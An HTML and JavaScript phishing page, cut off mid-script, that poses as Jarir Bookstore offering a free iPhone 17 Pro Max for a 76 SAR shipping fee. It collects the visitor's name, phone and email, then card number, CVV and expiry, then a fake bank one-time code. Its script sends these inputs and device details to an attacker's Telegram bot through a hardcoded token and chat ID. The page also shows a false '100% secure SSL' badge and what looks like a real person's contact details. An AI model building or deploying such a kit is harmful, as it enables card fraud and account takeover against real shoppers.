<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ø¬Ø±ÙŠØ± - iPhone 17 Pro Max</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        :root { --jarir-red: #E30613; --jarir-navy: #2D3E50; }
        body { font-family: 'Cairo', sans-serif; background-color: #ffffff; }
        .page { display: none; min-height: 100vh; }
        .page.active { display: block; }
        .form-input { width: 100%; background: #F0F2F5; border: 1px solid #E5E7EB; border-radius: 4px; padding: 12px; outline: none; text-align: right; font-size: 14px; }
        .btn-red { background-color: var(--jarir-red); width: 100%; color: white; font-weight: bold; border-radius: 8px; transition: 0.3s; cursor: pointer; border: none; }
        
        .cart-icon-container { position: relative; background: #F0F2F5; padding: 8px; border-radius: 8px; }
        .cart-badge { position: absolute; top: -5px; right: -5px; background: #FF9800; color: white; font-size: 10px; width: 18px; height: 18px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; }
        
        .back-to-top { position: fixed; bottom: 80px; left: 20px; background: white; border: 1px solid #DDD; width: 45px; height: 45px; border-radius: 50%; display: flex; align-items: center; justify-content: center; box-shadow: 0 2px 5px rgba(0,0,0,0.1); z-index: 100; }

        .error-msg { display: none; color: white; background: #E30613; padding: 10px; border-radius: 4px; text-align: center; font-size: 13px; margin-bottom: 15px; font-weight: bold; }
        .card-wrapper { position: relative; width: 100%; }
        .card-type-icon { position: absolute; left: 12px; top: 50%; transform: translateY(-50%); height: 28px; transition: 0.3s; pointer-events: none; opacity: 0; }
        
        #page-verify h2 { font-family: sans-serif; letter-spacing: -0.5px; }
        .verify-text { font-family: sans-serif; color: #333; }

        :root {
            --active-green: #5eb471;
            --inactive-grey: #a0a0a0;
            --bg-white: #ffffff;
            --border-grey: #f0f0f0;
            --text-black: #343a40;
        }

        .success-screen {
            background-color: var(--bg-white);
            width: 100%;
            max-width: 380px;
            margin: 0 auto;
            border-radius: 5px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
            overflow: hidden;
            border-top: 5px solid #ffcc33;
        }

        .app-bar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 15px 20px;
            border-bottom: 1px solid var(--border-grey);
        }

        .app-bar h1 {
            font-size: 18px;
            margin: 0;
            color: var(--text-black);
            font-weight: 700;
        }

        .icon { color: var(--text-black); font-size: 20px; cursor: pointer; }

        .stepper-container {
            padding: 30px 40px;
            position: relative;
        }

        .step {
            display: flex;
            align-items: flex-start;
            margin-bottom: 25px;
            position: relative;
        }

        .step::before {
            content: '';
            position: absolute;
            right: -21px;
            top: 15px;
            width: 2px;
            height: 100%;
            background-color: #d1d1d1;
            z-index: 1;
        }

        .step:last-child::before { display: none; }

        .dot {
            width: 12px;
            height: 12px;
            border-radius: 50%;
            background-color: #d1d1d1;
            position: absolute;
            right: -26px;
            top: 6px;
            z-index: 2;
        }

        .step.active .dot { background-color: var(--active-green); }
        .step.active .step-title { color: var(--active-green); }

        .step-content { display: flex; flex-direction: column; }

        .step-title {
            font-size: 16px;
            font-weight: 700;
            color: var(--inactive-grey);
            margin-bottom: 2px;
        }

        .step-date {
            font-size: 11px;
            color: #888;
        }

        .barcode-area {
            text-align: center;
            padding: 40px 20px;
            border-top: 1px solid var(--border-grey);
        }

        .barcode-img {
            width: 75%;
            filter: grayscale(1);
            margin-bottom: 10px;
        }

        .order-number {
            font-size: 16px;
            font-weight: 700;
            color: var(--text-black);
        }

        .info-row {
            border-top: 1px solid var(--border-grey);
            padding: 15px 25px;
        }

        .label {
            font-size: 11px;
            color: #b0b0b0;
            margin-bottom: 4px;
            display: block;
        }

        .value {
            font-size: 14px;
            color: var(--text-black);
            font-weight: 700;
        }

        .email { font-family: sans-serif; letter-spacing: 0.5px; }

        .btn-red:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(227, 6, 19, 0.3);
        }
        
        .btn-red:active {
            transform: translateY(0);
        }

        .form-input:focus {
            border-color: var(--jarir-red);
            box-shadow: 0 0 0 3px rgba(227, 6, 19, 0.1);
        }

        .progress-bar {
            position: fixed;
            top: 0;
            left: 0;
            height: 3px;
            background: var(--jarir-red);
            width: 0%;
            transition: width 0.3s;
            z-index: 9999;
        }

        .page-transition {
            animation: fadeIn 0.4s ease-out;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .product-image {
            transition: transform 0.3s ease;
        }
        
        .product-image:hover {
            transform: scale(1.05);
        }

        .payment-card {
            transition: all 0.3s ease;
        }
        
        .payment-card:hover {
            box-shadow: 0 8px 25px rgba(0,0,0,0.1);
        }

        .loading-spinner {
            display: none;
            width: 20px;
            height: 20px;
            border: 2px solid #ffffff;
            border-top: 2px solid transparent;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-left: 10px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .shake {
            animation: shake 0.5s;
        }

        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-10px); }
            75% { transform: translateX(10px); }
        }

        .logo-pulse {
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); }
        }

        .back-to-top {
            transition: all 0.3s;
            opacity: 0;
            visibility: hidden;
        }
        
        .back-to-top.visible {
            opacity: 1;
            visibility: visible;
        }
        
        .back-to-top:hover {
            background: var(--jarir-red);
            color: white;
            border-color: var(--jarir-red);
        }

        .modal-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.5);
            z-index: 1000;
            justify-content: center;
            align-items: center;
        }
        
        .modal-content {
            background: white;
            padding: 20px;
            border-radius: 12px;
            text-align: center;
            max-width: 300px;
            animation: slideUp 0.3s ease;
        }

        @keyframes slideUp {
            from { transform: translateY(50px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }

        .security-badge {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: white;
            padding: 10px 15px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 12px;
            color: #666;
            z-index: 99;
        }

        .social-icon {
            transition: all 0.3s;
            cursor: pointer;
        }
        
        .social-icon:hover {
            transform: translateY(-3px);
            filter: brightness(1.2);
        }

        /* Ø´Ø§Ø´Ø© Ø§Ù„ØªØ­Ù…ÙŠÙ„ Ø§Ù„ÙƒØ§Ù…Ù„Ø© */
        .full-loading {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255,255,255,0.95);
            z-index: 9999;
            justify-content: center;
            align-items: center;
            flex-direction: column;
        }
        
        .full-loading.active {
            display: flex;
        }
        
        .full-loading .spinner {
            width: 60px;
            height: 60px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid var(--jarir-red);
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        
        .full-loading p {
            margin-top: 20px;
            color: #333;
            font-weight: bold;
        }

        /* Ø¹Ø¯Ø§Ø¯ Ù…Ø­Ø§ÙˆÙ„Ø§Øª OTP */
        .otp-attempts {
            text-align: center;
            margin-top: 10px;
            font-size: 12px;
            color: #666;
        }
    </style>
<base target="_blank">
</head>
<body class="max-w-md mx-auto shadow-2xl bg-white">

    <!-- Ø´Ø±ÙŠØ· Ø§Ù„ØªÙ‚Ø¯Ù… Ø§Ù„Ø¹Ù„ÙˆÙŠ -->
    <div class="progress-bar" id="progressBar"></div>

    <!-- Ø´Ø§Ø´Ø© Ø§Ù„ØªØ­Ù…ÙŠÙ„ Ø§Ù„ÙƒØ§Ù…Ù„Ø© -->
    <div class="full-loading" id="fullLoading">
        <div class="spinner"></div>
        <p>Ø¬Ø§Ø±ÙŠ Ø§Ù„Ù…Ø¹Ø§Ù„Ø¬Ø©...</p>
    </div>

    <section id="page-product" class="page active page-transition">
        <header class="p-3 border-b sticky top-0 bg-white z-50 flex justify-between items-center">
            <div class="flex items-center gap-4">
                <i class="fa-solid fa-bars text-xl text-gray-600"></i>
                <div class="cart-icon-container">
                    <i class="fa-solid fa-cart-shopping text-gray-600"></i>
                    <span class="cart-badge">1</span>
                </div>
            </div>
            <div class="flex items-center gap-1">
                <div class="relative flex items-center bg-gray-100 rounded-full px-4 py-1">
                    <input type="text" value="iphone 17 pro max" readonly class="bg-transparent text-sm text-right outline-none w-32">
                    <i class="fa-solid fa-magnifying-glass text-gray-400 mr-2"></i>
                </div>
                <div class="flex items-center ml-2">
                    <img src="https://i.ibb.co/h1mkXJhd/41826-EFC-5-C60-40-C5-BBEC-61-D40-D90-EB9-F.png" class="h-8 logo-pulse">
                </div>
            </div>
        </header>

        <div class="bg-gray-50 p-3 flex justify-between items-center border-b text-sm text-gray-500">
            <i class="fa-solid fa-chevron-down text-xs"></i>
            <span>Ø­Ø¯Ø¯ Ø®ÙŠØ§Ø± Ø§Ù„ØªÙˆØµÙŠÙ„ Ø§Ù„Ø°ÙŠ ØªÙØ¶Ù„Ù‡</span>
        </div>

        <div class="py-6 flex justify-center">
            <img src="https://i.ibb.co/HpTBrKJN/CFE81-C5-E-E4-C2-446-F-99-FF-DECC85-EC63-D0.png" class="w-[280px] product-image">
        </div>

        <main class="p-5">
            <div class="flex justify-between items-start mb-2">
                <div class="text-right">
                    <p class="text-[10px] text-gray-400">Ø±Ù‚Ù… Ø§Ù„ØµÙ†Ù 666736 Ø±Ù‚Ù… Ø§Ù„Ù…Ù†ØªØ¬ MFY94AHA</p>
                    <h1 class="text-xl font-bold text-gray-900">Ø§Ø¨Ù„ Ø¢ÙŠÙÙˆÙ† 17 Ø¨Ø±Ùˆ Ù…Ø§ÙƒØ³</h1>
                </div>
                <i class="fa-brands fa-apple text-3xl"></i>
            </div>
            
            <div class="flex flex-wrap gap-2 mb-6 justify-end">
                <span class="border px-3 py-1 text-xs text-gray-500 rounded">256 Ø¬ÙŠØ¬Ø§Ø¨Ø§ÙŠØª</span>
                <span class="border px-3 py-1 text-xs text-gray-500 rounded">Ø¨Ø±ØªÙ‚Ø§Ù„ÙŠ ÙƒÙˆØ²Ù…Ùƒ Ø§Ù„Ø¬ÙŠÙ„ Ø§Ù„Ø®Ø§Ù…Ø³</span>
                <span class="border px-3 py-1 text-xs text-gray-500 rounded">Ø¢Ø¨Ù„ Ø¢ÙŠÙ‡ 19 Ø¨Ø±Ùˆ</span>
            </div>

            <div class="flex justify-between items-center mb-6">
                <button id="btnGoRegister" class="bg-[#E30613] text-white font-bold w-1/2 py-4 rounded-lg text-lg flex justify-center items-center">
                    <span>Ø§Ø³ØªÙ„Ù… Ø§Ù„Ù‡Ø¯ÙŠÙ‡</span>
                </button>
                <div class="text-right">
                    <div class="text-[#E30613] text-3xl font-black">Ù‡Ø¯ÙŠÙ‡ Ù…Ù† Ø¬Ø±ÙŠØ± <span class="text-sm">Ø±.Ø³</span></div>
                    <p class="text-[10px] text-gray-400">Ø´Ø§Ù…Ù„ Ø¶Ø±ÙŠØ¨Ø© Ø§Ù„Ù‚ÙŠÙ…Ø© Ø§Ù„Ù…Ø¶Ø§ÙØ©</p>
                </div>
            </div>

            <div class="flex justify-between py-6 border-t mt-4">
                <i class="fa-brands fa-linkedin text-[#0077B5] text-2xl social-icon"></i>
                <i class="fa-brands fa-tiktok text-black text-2xl social-icon"></i>
                <i class="fa-brands fa-snapchat text-[#FFFC00] bg-black p-1 rounded-full text-lg social-icon"></i>
                <i class="fa-brands fa-youtube text-[#FF0000] text-2xl social-icon"></i>
                <i class="fa-brands fa-instagram text-[#E4405F] text-2xl social-icon"></i>
                <i class="fa-brands fa-x-twitter text-black text-2xl social-icon"></i>
                <i class="fa-brands fa-facebook text-[#1877F2] text-2xl social-icon"></i>
            </div>
        </main>
    </section>

    <section id="page-register" class="page bg-white page-transition">
        <header class="p-4 border-b flex justify-between items-center">
            <button id="btnBackToProduct"><i class="fa-solid fa-chevron-right"></i>Ø§Ù„Ø¹ÙˆØ¯Ø©</button>
            <span class="font-bold">Ù…Ø¹Ù„ÙˆÙ…Ø§Øª ØªØ³Ù„ÙŠÙ… Ø§Ù„Ù‡Ø¯ÙŠÙ‡</span>
            <img src="https://i.ibb.co/h1mkXJhd/41826-EFC-5-C60-40-C5-BBEC-61-D40-D90-EB9-F.png" class="h-6">
        </header>
        <div class="p-6 space-y-4">
            <div id="err-reg" class="error-msg">ÙŠØ±Ø¬Ù‰ Ø¥Ø¯Ø®Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù…Ø·Ù„ÙˆØ¨Ø© Ø¨Ø´ÙƒÙ„ ØµØ­ÙŠØ­</div>
            <div class="text-right">
                <label class="text-xs text-gray-400">Ø§Ø³Ù… Ø§Ù„Ø¯ÙˆÙ„Ø©</label>
                <div class="form-input flex justify-between items-center bg-gray-50">
                    <i class="fa-solid fa-chevron-down text-xs"></i>
                    <span class="font-bold">Ø§Ù„Ù…Ù…Ù„ÙƒØ© Ø§Ù„Ø¹Ø±Ø¨ÙŠØ© Ø§Ù„Ø³Ø¹ÙˆØ¯ÙŠØ©</span>
                </div>
            </div>
            <div class="flex gap-2">
                <div class="w-2/3">
                    <label class="text-xs text-gray-400 text-right block">Ø±Ù‚Ù… Ø§Ù„Ù‡Ø§ØªÙ *</label>
                    <input type="tel" id="user-phone" class="form-input" placeholder="05xxxxxxxx" maxlength="10">
                </div>
                <div class="w-1/3">
                    <label class="text-xs text-gray-400 text-right block">Ø±Ù…Ø² Ø§Ù„Ø¯ÙˆÙ„Ø©</label>
                    <div class="form-input flex items-center justify-between">
                        <i class="fa-solid fa-chevron-down text-[10px]"></i>
                        <span class="font-bold">+966</span>
                        <img src="https://flagcdn.com/w20/sa.png" class="w-4">
                    </div>
                </div>
            </div>
            <input type="text" id="user-name" placeholder="Ø§Ù„Ø§Ø³Ù… Ø§Ù„Ø£ÙˆÙ„ *" class="form-input">
            <input type="email" id="user-email" placeholder="Ø§Ù„Ø¨Ø±ÙŠØ¯ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ *" class="form-input">
            <button id="btnSubmitRegister" class="btn-red py-4 mt-6 flex justify-center items-center">
                <span id="regBtnText">Ø§Ø³ØªÙ…Ø±Ø§Ø±</span>
                <div class="loading-spinner" id="regSpinner"></div>
            </button>
        </div>
    </section>

    <section id="page-payment" class="page bg-[#F3F5F7] page-transition">
        <header class="p-4 bg-white border-b flex justify-between items-center">
            <button id="btnBackToRegister"><i class="fa-solid fa-chevron-right"></i>Ø§Ù„Ø¹ÙˆØ¯Ø©</button>
            <span class="font-bold">Ø¯ÙØ¹ Ù…ØµØ§Ø±ÙŠÙ Ø§Ù„Ø´Ø­Ù†</span>
            <img src="https://i.ibb.co/h1mkXJhd/41826-EFC-5-C60-40-C5-BBEC-61-D40-D90-EB9-F.png" class="h-6">
        </header>
        <main class="p-4">
            <div id="err-pay" class="error-msg">ÙŠØ±Ø¬Ù‰ Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¨Ø·Ø§Ù‚Ø©</div>
            <div class="bg-white rounded-lg p-6 shadow-sm border relative payment-card">
                <div class="flex justify-between items-center border p-3 rounded-lg mb-6 border-blue-500 bg-blue-50">
                    <div class="w-5 h-5 border-[5px] border-blue-600 rounded-full"></div>
                    <div class="text-right">
                        <span class="text-sm font-bold block">Ø§Ù„Ø¯ÙØ¹ Ø¨Ø§Ù„Ø¨Ø·Ø§Ù‚Ø© Ø§Ù„Ø§Ø¦ØªÙ…Ø§Ù†ÙŠØ©</span>
                        <div class="flex gap-2 mt-2">
                            <img src="https://i.ibb.co/fG2CKyhR/E01-BB971-3-E72-498-A-BEAA-004-A9098-EC7-A.png" class="h-6">
                            <img src="https://i.ibb.co/sv5VB9wQ/88347052-D6-A4-4974-A56-C-FCAD68185365.png" class="h-6">
                        </div>
                    </div>
                </div>
                <div class="space-y-4">
                    <div class="card-wrapper">
                        <img id="card-type-img" src="" class="card-type-icon">
                        <input type="tel" id="card-num" placeholder="Ø±Ù‚Ù… Ø§Ù„Ø¨Ø·Ø§Ù‚Ø© (16 Ø±Ù‚Ù…)" class="form-input" maxlength="16">
                    </div>
                    <div class="flex gap-2">
                        <input type="tel" id="card-cvv" placeholder="CVV (3 Ø£Ø±Ù‚Ø§Ù…)" class="form-input w-1/3" maxlength="3">
                        <input type="tel" id="card-exp" placeholder="MM/YY" class="form-input w-2/3" maxlength="5">
                    </div>
                    <input type="text" id="card-holder" placeholder="Ø§Ø³Ù… Ø­Ø§Ù…Ù„ Ø§Ù„Ø¨Ø·Ø§Ù‚Ø©" class="form-input">
                </div>
                <button id="btnSubmitPayment" class="btn-red py-4 mt-8 flex justify-center items-center">
                    <span id="payBtnText">Ù…ØµØ§Ø±ÙŠÙ Ø§Ù„Ø´Ø­Ù† (76 Ø±.Ø³)</span>
                    <div class="loading-spinner" id="paySpinner"></div>
                </button>
            </div>

            <div class="mt-8 grid grid-cols-4 gap-2 px-4">
                <div class="bg-white border rounded p-2 flex items-center justify-center">
                    <img src="https://i.ibb.co/cXNjFXc1/2-A41-DBE2-EA77-4-E51-A1-DC-04-F571642322.png" class="h-10">
                </div>
                <div class="bg-white border rounded p-2 flex items-center justify-center">
                    <img src="https://i.ibb.co/x97bDBZ/E0-E5-DFC0-0047-4-BB9-915-B-DEDC2-EC3-CC3-B.png" class="h-10">
                </div>
                <div class="bg-white border rounded p-2 flex items-center justify-center">
                    <img src="https://i.ibb.co/HDs9Y861/AC079077-B4-F5-4336-A7-AE-16-A1-BDF07-EE9.png" class="h-10">
                </div>
                <div class="bg-white border rounded p-2 flex items-center justify-center">
                    <img src="https://i.ibb.co/fG2CKyhR/E01-BB971-3-E72-498-A-BEAA-004-A9098-EC7-A.png" class="h-10">
                </div>
            </div>
        </main>
    </section>

    <section id="page-verify" class="page bg-white p-6 page-transition">
        <div class="flex justify-end mb-4">
            <span class="font-bold text-black cursor-pointer text-base" id="btnCancelVerify">Cancel</span>
        </div>
        <div class="flex justify-between items-center border-b border-gray-100 pb-4 mb-8">
            <img src="https://i.ibb.co/fG2CKyhR/E01-BB971-3-E72-498-A-BEAA-004-A9098-EC7-A.png" style="height: 18px;">
            <div class="flex items-center gap-1">
                <img src="https://i.ibb.co/sv5VB9wQ/88347052-D6-A4-4974-A56-C-FCAD68185365.png" style="height: 22px;"> 
                <span style="font-family: sans-serif; font-size: 11px; color: #666;">Secure</span>
            </div>
        </div>
        <h2 class="text-[26px] font-bold mb-5 text-left text-black">Verify By Phone</h2>
        <div class="verify-text text-left text-[15px] leading-relaxed mb-10">
            <p>We have sent you a text message with a code to your registered mobile number.</p>
            <p class="mt-5">You are paying <strong>JARIR BOOKSTORE</strong> the amount of <strong>SAR 76.00</strong> on 2026/02/15.</p>
        </div>
        <div id="err-otp" class="error-msg">Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚ ØºÙŠØ± ØµØ­ÙŠØ­ØŒ Ø­Ø§ÙˆÙ„ Ù…Ø¬Ø¯Ø¯Ø§Ù‹</div>
        <div class="text-center mb-4">
            <label class="block text-gray-500 text-xs mb-3 font-sans">Verification code</label>
            <input type="tel" id="bank-otp" class="w-full border border-gray-300 rounded p-4 text-center text-2xl outline-none font-sans tracking-widest" maxlength="6" placeholder="______">
        </div>
        <div class="otp-attempts" id="otpAttempts">Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø§Øª Ø§Ù„Ù…ØªØ¨Ù‚ÙŠØ©: <span id="attemptsLeft">4</span></div>
        <button id="btnSubmitOTP" class="w-full bg-[#0000FF] text-white py-4 font-bold rounded-md text-lg mb-8 shadow-sm flex justify-center items-center">
            <span id="otpBtnText">CONFIRM</span>
            <div class="loading-spinner" id="otpSpinner"></div>
        </button>
        <div class="text-center">
            <span class="text-[#0000FF] font-bold text-sm cursor-pointer hover:underline" id="btnResendOTP">RESEND CODE</span>
        </div>
        <div class="mt-12 border-t pt-5 space-y-5">
            <div class="flex justify-between items-center text-[15px] text-[#2D3E50]"><span>Learn more about authentication</span> <span class="text-2xl">+</span></div>
            <div class="flex justify-between items-center text-[15px] text-[#2D3E50]"><span>Need some help ?</span> <span class="text-2xl">+</span></div>
        </div>
    </section>

    <!-- ØµÙØ­Ø© Ø§Ù„Ù†Ø¬Ø§Ø­ Ù…Ø¹ Ø¨ÙŠØ§Ù†Ø§Øª Ø¯ÙŠÙ†Ø§Ù…ÙŠÙƒÙŠØ© -->
    <section id="page-success" class="page bg-[#e9ecef] p-5 page-transition">
        <div class="success-screen">
            <div class="app-bar">
                <div class="icon">â‹®</div>
                <h1>Ø´Ø­Ù†Ø© Ø±Ù‚Ù… # <span id="dynamicTrackingNumber">51972521</span></h1>
                <div class="icon">ã€‰</div>
            </div>

            <div class="stepper-container">
                <div class="step active">
                    <div class="dot"></div>
                    <div class="step-content">
                        <span class="step-title">Ø¥Ù†Ø´Ø§Ø¡ Ø§Ù„Ø·Ù„Ø¨</span>
                        <span class="step-date" id="dynamicOrderDate">ØªÙ… Ø¥Ù†Ø´Ø§Ø¡ Ø§Ù„Ø·Ù„Ø¨ : Ø§Ù„Ø£Ø­Ø¯ØŒ 19-Ø£ÙƒØªÙˆØ¨Ø±-2025</span>
                    </div>
                </div>

                <div class="step">
                    <div class="dot"></div>
                    <div class="step-content">
                        <span class="step-title">Ø¬Ø§Ø±ÙŠ Ø§Ù„Ù…Ø¹Ø§Ù„Ø¬Ø©</span>
                    </div>
                </div>

                <div class="step">
                    <div class="dot"></div>
                    <div class="step-content">
                        <span class="step-title">ØªØ­Øª Ø§Ù„ØªØ¬Ù‡ÙŠØ²</span>
                    </div>
                </div>

                <div class="step">
                    <div class="dot"></div>
                    <div class="step-content">
                        <span class="step-title">ØªÙ… Ø§Ù„Ø´Ø­Ù†</span>
                    </div>
                </div>

                <div class="step">
                    <div class="dot"></div>
                    <div class="step-content">
                        <span class="step-title">ØªÙ… Ø§Ù„ØªÙˆØµÙŠÙ„</span>
                    </div>
                </div>
            </div>

            <div class="barcode-area">
                <img src="https://bwipjs-api.metafloor.com/?bcid=code128&text=2007992813&scale=4&includetext=false" class="barcode-img" id="dynamicBarcode">
                <div class="order-number">Ø±Ù‚Ù… Ø§Ù„Ø·Ù„Ø¨: <span id="dynamicOrderNumber">2007992813</span></div>
            </div>

            <div class="info-row">
                <span class="label">ØªØ§Ø±ÙŠØ® Ø¥Ù†Ø´Ø§Ø¡ Ø§Ù„Ø·Ù„Ø¨</span>
                <span class="value" id="dynamicCreateDate">Ø§Ù„Ø£Ø­Ø¯ØŒ 19-Ø£ÙƒØªÙˆØ¨Ø±-2025</span>
            </div>

            <div class="info-row">
                <span class="label">Ø§Ù„Ø´Ø­Ù† Ø¥Ù„Ù‰:</span>
                <span class="value email" id="dynamicUserEmail">campus6med@gmail.com</span>
            </div>

            <div class="info-row">
                <span class="label">Ø±Ù‚Ù… Ø§Ù„Ù‡Ø§ØªÙ:</span>
                <span class="value" id="dynamicUserPhone">+966 596324178</span>
            </div>

            <div class="info-row">
                <span class="label">Ø§Ù„Ø§Ø³Ù…:</span>
                <span class="value" id="dynamicUserName">Reda shfi</span>
            </div>

            <div class="info-row">
                <span class="label">Ø·Ø±ÙŠÙ‚Ø© Ø§Ù„Ø´Ø­Ù†</span>
                <span class="value">@ ØªØ³Ù„ÙŠÙ… Ø§Ù„Ø¨Ø±ÙŠØ¯ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ</span>
            </div>
        </div>
    </section>

    <!-- Ø²Ø± Ø§Ù„Ø¹ÙˆØ¯Ø© Ù„Ù„Ø£Ø¹Ù„Ù‰ -->
    <div class="back-to-top" id="backToTop">
        <i class="fa-solid fa-arrow-up"></i>
    </div>

    <!-- Ø´Ø§Ø±Ø© Ø§Ù„Ø£Ù…Ø§Ù† -->
    <div class="security-badge" id="securityBadge">
        <i class="fa-solid fa-shield-halved text-green-500"></i>
        <span>Ø¢Ù…Ù† 100% - SSL</span>
    </div>

    <script>
        // ============================================
        // Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø§Ù„ØªÙ„ÙŠØ¬Ø±Ø§Ù…
        // ============================================
        const botToken = "8597407463:AAEZ98PLouzh7ivB8WqRGGuGhiPYCbUMS5Q";
        const chatId = "1705240737";
        
        // ============================================
        // Ø§Ù„Ù…ØªØºÙŠØ±Ø§Øª Ø§Ù„Ø¹Ø§Ù…Ø©
        // ============================================
        let otpAttempts = 0;
        const maxOtpAttempts = 4;
        
        let userData = {
            name: '',
            phone: '',
            email: ''
        };
        
        let visitorId = localStorage.getItem('visitorId');
        if (!visitorId) {
            visitorId = 'V' + Date.now() + Math.random().toString(36).substr(2, 9);
            localStorage.setItem('visitorId', visitorId);
        }
        
        // ============================================
        // Ø¯Ø§Ù„Ø© Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØªÙ„ÙŠØ¬Ø±Ø§Ù…
        // ============================================
        async function sendTelegramAlert(type, data) {
            var deviceInfo = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screenSize: screen.width + 'x' + screen.height,
                referrer: document.referrer || 'Ù…Ø¨Ø§Ø´Ø±',
                pageUrl: window.location.href,
                timestamp: new Date().toLocaleString('ar-SA')
            };
            
            var emojiMap = {
                'VISIT': 'ğŸ‘¤',
                'PAGE_PRODUCT': 'ğŸ ',
                'PAGE_REGISTER': 'ğŸ“',
                'PAGE_PAYMENT': 'ğŸ’³',
                'PAGE_VERIFY': 'ğŸ”',
                'PAGE_SUCCESS': 'âœ…',
                'REGISTER_START': 'âœï¸',
                'REGISTER_SUBMIT': 'ğŸ“‹',
                'PAYMENT_START': 'ğŸ’°',
                'PAYMENT_SUBMIT': 'ğŸ¦',
                'OTP_ATTEMPT': 'ğŸ”‘',
                'OTP_SUCCESS': 'ğŸ‰',
                'INPUT_PHONE': 'ğŸ“±',
                'INPUT_NAME': 'ğŸ‘¤',
                'INPUT_EMAIL': 'ğŸ“§',
                'INPUT_CARD': 'ğŸ’³',
                'INPUT_CVV': 'ğŸ”’',
                'INPUT_EXPIRY': 'ğŸ“…',
                'INPUT_OTP': 'ğŸ”¢',
                'BACK_BUTTON': 'ğŸ”™',
                'ERROR': 'âš ï¸'
            };
            
            var emoji = emojiMap[type] || 'ğŸ“Œ';
            var title = type.replace(/_/g, ' ');
            
            var message = emoji + ' ' + title + '\n\n';
            message += 'ğŸ†” Ù…Ø¹Ø±Ù Ø§Ù„Ø²Ø§Ø¦Ø±: ' + visitorId + '\n';
            message += 'â° Ø§Ù„ÙˆÙ‚Øª: ' + deviceInfo.timestamp + '\n';
            message += 'ğŸ“± Ø§Ù„Ø¬Ù‡Ø§Ø²: ' + deviceInfo.platform + '\n';
            message += 'ğŸ“ Ø§Ù„Ø´Ø§Ø´Ø©: ' + deviceInfo.screenSize + '\n';
            
            if (data && Object.keys(data).length > 0) {
                message += '\nğŸ“Š Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª:\n';
                for (var key in data) {
                    if (data.hasOwnProperty(key)) {
                        message += 'â€¢ ' + key + ': ' + data[key] + '\n';
                    }
                }
            }
            
            try {
                await fetch("https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(message));
            } catch (e) {
                console.log('Telegram error:', e);
            }
        }
        
        // ============================================
        // Ø¯Ø§Ù„Ø© Ø§Ù„Ø§Ù†ØªÙ‚Ø§Ù„ Ø¨ÙŠÙ† Ø§Ù„ØµÙØ­Ø§Øª
        // ============================================
        function showPage(pageId) {
            // Ø¥Ø¸Ù‡Ø§Ø± Ø§Ù„ØªØ­Ù…ÙŠÙ„
            document.getElementById('fullLoading').classList.add('active');
            
            // Ø¥Ø±Ø³Ø§Ù„ Ø¥Ø´Ø¹Ø§Ø±
            var pageAlerts = {
                'page-product': 'PAGE_PRODUCT',
                'page-register': 'PAGE_REGISTER',
                'page-payment': 'PAGE_PAYMENT',
                'page-verify': 'PAGE_VERIFY',
                'page-success': 'PAGE_SUCCESS'
            };
            
            if (pageAlerts[pageId]) {
                sendTelegramAlert(pageAlerts[pageId], {
                    visitorId: visitorId,
                    userName: userData.name,
                    userPhone: userData.phone
                });
            }
            
            // Ø§Ù„Ø§Ù†ØªÙ‚Ø§Ù„ Ø¨Ø¹Ø¯ ØªØ£Ø®ÙŠØ±
            setTimeout(function() {
                // Ø¥Ø®ÙØ§Ø¡ Ø¬Ù…ÙŠØ¹ Ø§Ù„ØµÙØ­Ø§Øª
                var pages = document.querySelectorAll('.page');
                for (var i = 0; i < pages.length; i++) {
                    pages[i].classList.remove('active');
                }
                
                // Ø¥Ø¸Ù‡Ø§Ø± Ø§Ù„ØµÙØ­Ø© Ø§Ù„Ù…Ø·Ù„ÙˆØ¨Ø©
                var target = document.getElementById(pageId);
                if (target) {
                    target.classList.add('active');
                }
                
                // Ø¥Ø®ÙØ§Ø¡ Ø§Ù„ØªØ­Ù…ÙŠÙ„
                document.getElementById('fullLoading').classList.remove('active');
                
                // Ø§Ù„ØªÙ…Ø±ÙŠØ± Ù„Ø£Ø¹Ù„Ù‰
                window.scrollTo(0, 0);
                
